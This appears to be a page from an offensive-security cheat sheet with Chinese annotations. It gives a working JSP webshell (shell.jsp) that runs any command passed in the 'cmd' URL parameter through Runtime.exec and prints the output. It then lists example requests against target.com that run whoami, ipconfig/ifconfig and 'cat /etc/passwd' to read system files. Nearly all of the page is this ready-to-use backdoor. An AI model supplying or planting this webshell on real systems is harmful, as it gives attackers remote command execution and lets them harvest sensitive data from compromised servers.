---
outline: deep
---

# java file

## jsp文件

```jsp
<%
	out.print("hello hacker");
%>
```

### webshell

*shell.jsp*
```jsp
<%
    String command = request.getParameter("cmd");
    if(command != null)
    {
        java.io.InputStream in=Runtime.getRuntime().exec(command).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1)
        {
            out.println(new String(b));
        }
        out.print("</pre>");
    } else {
        out.print("format: xxx.jsp?cmd=Command");
    }
%>
```

```html
http://target.com/shell.jsp?cmd=whoami（查看当前运行用户权限）
http://target.com/shell.jsp?cmd=ipconfig 或 ifconfig（查看网络配置）
http://target.com/shell.jsp?cmd=cat /etc/passwd（读取敏感文件）
```